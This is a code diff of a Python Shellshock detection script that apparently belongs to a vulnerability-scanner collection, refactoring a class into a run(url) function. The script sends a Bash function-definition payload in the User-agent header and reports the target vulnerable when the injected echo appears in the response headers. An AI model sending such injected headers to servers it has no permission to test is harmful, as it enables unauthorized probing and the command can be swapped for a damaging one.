@@ -10,35 +10,29 @@ description: 在bash 1.14至bash 4.3的Linux/Unix系统版本中，bash在处理
 import sys
 import warnings
 import requests
+def run(url):
+    result = ['shellshock漏洞','','']
+    headers = {
+        "User-agent":'() { :;}; echo \"Shellshock: Server Vulnerable\"',
+        "Accept":"text/plain",
+        "Content-type":"application/x-www-form-urlencoded"
+    }
+    payload = ""
+    vulnurl = url + payload
+    try:
+        req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
 
-
-class BaseVerify:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
-        result = ['shellshock漏洞','','']
-        headers = {
-            "User-agent":'() { :;}; echo \"Shellshock: Server Vulnerable\"',
-            "Accept":"text/plain",
-            "Content-type":"application/x-www-form-urlencoded"
-        }
-        payload = ""
-        vulnurl = self.url + payload
-        try:
-            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
-
-            if r"Shellshock" in req.headers:
-                result[2] = '存在'
-                result[1] = vulnurl
-            else:
-                result[2] = '不存在'
-
-        except:
+        if r"Shellshock" in req.headers:
+            result[2] = '存在'
+            result[1] = vulnurl
+        else:
             result[2] = '不存在'
-        return result
+
+    except:
+        result[2] = '不存在'
+    return result
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = BaseVerify(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+
